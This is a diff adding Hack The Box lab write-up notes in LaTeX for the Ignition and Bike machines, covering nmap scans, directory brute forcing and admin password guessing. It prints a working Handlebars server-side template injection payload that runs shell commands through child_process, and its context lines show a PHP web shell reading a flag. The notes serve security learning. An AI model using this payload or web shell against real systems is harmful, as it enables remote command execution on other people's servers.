@@ -22,6 +22,16 @@
   minted options={texcl=true},
   left=1mm,
 }
+\newtcblisting{js}{
+  listing engine=minted,
+  colback=bg,
+  colframe=black!70,
+  listing only,
+  minted style=borland,
+  minted language=js,
+  minted options={texcl=true},
+  left=1mm,
+}
 \newtcblisting{html}{
   listing engine=minted,
   colback=bg,
@@ -842,5 +852,85 @@ http://thetoppers.htb/shell.php?cmd=ls ..
 flag.txt html
 http://thetoppers.htb/shell.php?cmd=cat ../flag.txt
 \end{txt}
+
+\subsection{Ignition \faLinux}
+
+\begin{bash}
+nmap -T5 -p- -sV -sC --min-rate=1000 "10.129.127.25"
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.14.2
+\end{bash}
+\begin{bash}
+echo "10.129.127.25  ignition.htb" | sudo tee -a /etc/hosts
+\end{bash}
+
+Which service version is found to be running on port 80? \mintinline{bash}{nginx 1.14.2}.
+
+What is the 3-digit HTTP status code returned when you visit http://{machine IP}/? \mintinline{bash}{302} (redirection code). Can be seen in Burp.
+
+What is the virtual host name the webpage expects to be accessed by? \mintinline{bash}{ignition.htb}.
+
+What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs? \mintinline{bash}{/etc/hosts}.
+
+Use a tool to brute force directories on the webserver. What is the full URL to the Magento login page? \mintinline{bash}{http://ignition.htb/admin}.
+\begin{bash}
+gobuster dir -u http://ignition.htb -w common.txt -x php,html
+\end{bash}
+
+Look up the password requirements for Magento and also try searching for the most common passwords of 2023. Which password provides access to the admin account? \mintinline{bash}{qwerty123}. Literally search Google for top 10 most common passwords and try each one. Not very interesting. We could also use \mintinline{bash}{hydra} for this.
+
+\section{Bike \faLinux}
+
+ What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high. \mintinline{bash}{22,80}.
+\begin{bash}
+nmap -T5 -p- -sV -sC --min-rate=1000 "10.129.76.182"
+echo "10.129.76.182" | sudo tee -a /etc/hosts
+\end{bash}
+
+What software is running the service listening on the http/web port identified in the first question? \mintinline{bash}{node.js}, from Wappalyzer.
+
+What is the name of the Web Framework according to Wappalyzer? \mintinline{bash}{Express}, from Wappalyzer.
+
+What is the name of the vulnerability we test for by submitting \mintinline{bash}{{{7*7}}}? Server-Side Template Injection. \url{https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection}.
+
+What is the templating engine being used within Node.JS? \mintinline{bash}{handlebars}, from \mintinline{bash}{node.js}. Can be seen by putting \mintinline{bash}{{{7*7}}} in the email entry.
+
+What is the name of the BurpSuite tab used to encode text? Decoder. I need to study BurpSuite. The idea is to encode the SSTI code from HackTricks into an URL.
+
+In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use? \mintinline{bash}{URL}.
+
+When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error? \mintinline{bash}{require}. It's from a node.js module.
+
+What variable is the name of the top-level scope in Node.JS? \mintinline{bash}{global}.
+
+HackTricks' payload for \mintinline{bash}{handlebars} uses a module called \mintinline{bash}{require}, which is not global in \mintinline{bash}{node.js} and we can not access it. But if we search in the documentation \url{https://nodejs.org/api/globals.html}, we see that the module \mintinline{bash}{process} is global and have similar functionality as \mintinline{bash}{require}. So, we modify the payload to use the \mintinline{bash}{process} module. Remember it has to be encoded into an URL.
+\begin{js}
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push
+        "return process.mainModule.require('child_process').execSync('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+\end{js}
+
+The \mintinline{bash}{whoami} command through the payload returns \mintinline{bash}{root} in BurpSuite.
+Change the command to \mintinline{bash}{cat /root/flag.txt} and we have our flag!
+
+By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user? \mintinline{bash}{root}.
+
 
 \end{document}
